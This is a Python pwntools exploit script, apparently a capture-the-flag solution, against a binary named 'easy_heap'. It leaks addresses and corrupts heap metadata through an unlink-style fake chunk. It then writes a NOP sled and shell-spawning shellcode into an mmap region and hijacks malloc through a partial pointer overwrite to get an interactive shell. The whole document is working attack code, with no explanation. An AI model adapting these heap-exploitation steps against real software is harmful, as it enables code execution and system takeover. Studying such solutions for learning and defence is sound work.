#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import os
context.log_level = "critical"
context.binary = "./easy_heap"
elf = context.binary
libc = elf.libc

def add(size):
    io.sendlineafter(">> ", "1")
    io.sendlineafter("Size: ", str(size))

def delete(idx):
    io.sendlineafter(">> ", "2")
    io.sendlineafter("Index: ", str(idx))

def fill(idx, cont):
    io.sendlineafter(">> ", "3")
    io.sendlineafter("Index: ", str(idx))
    io.sendafter("Content: ", cont)
    sleep(0.01)

def DEBUG():
    base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[2], 16)
    print("\n================= DEBUG: ================")
    print("malloc @ {:#x}".format(base + 0x1023))
    print("fill @ {:#x}".format(base + 0x1219))
    print("free @ {:#x}".format(base + 0x1134))
    print("================= DEBUG: ================\n")
    pause()

io = process("./easy_heap")
io.recvuntil("Mmap: ")
mmap = int(io.recvline().strip(), 16)
print("mmap @ {:#x}".format(mmap))

add(0x88)
io.recvuntil(" Address")
elf.address = int(io.recvline().strip(), 16) - 0x202060 - 8
print("elf @ {:#x}".format(elf.address))
add(0xf0)
add(0x10)

ptr = elf.address + 0x202060 + 8
fill(0, fit({0x0: flat(0, 0x81, ptr - 0x18, ptr - 0x10),
            0x80: flat(0x80)
            }, filler = '0'))
delete(1)

fill(0, flat(0, 0, 0x88, elf.address + 0x202090, 0x88, mmap, 0x88, elf.address + 0x202090, '\n'))
fill(1, '\x90' * 0x10 + asm(shellcraft.sh()) + '\n')

# clean
add(0x168)

add(0x80)
add(0x68)
add(0xf0)
add(0x10)

delete(4)
fill(5, fit({0x60: p64(0x100)}, filler = '\0'))
delete(6)
delete(5)
add(0x80)

fill(2, flat(0x1000) + '\n')
fill(3, fit({0x228: flat(0x71, p16(0xdaed))}, filler = '\0') + '\n')

#  DEBUG()
add(0x68)
add(0x68)
fill(6, flat('\0' * 0x13, mmap) + '\n')
add(0)

io.interactive()
